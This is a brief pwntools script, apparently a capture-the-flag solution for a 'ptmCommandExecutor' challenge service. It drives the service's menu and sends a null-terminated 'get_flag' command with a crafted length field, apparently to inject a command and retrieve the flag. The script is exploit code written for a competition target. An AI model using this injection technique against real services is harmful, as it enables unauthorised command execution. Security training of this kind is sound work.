from pwn import *

r = process('./ptmCommandExecutor')
r = remote('ptmcommandexecutor.challs.m0lecon.it',7777)
print(r.recv(1024).decode())
r.sendline(b'1') #option
print(r.recv(1024))
r.sendline(b'9') #len cmd
print(r.recv(1024))
r.sendline(b'get_flag\x00')
print(r.recv(1024))
r.sendline(b'n')
print(r.recv(1024))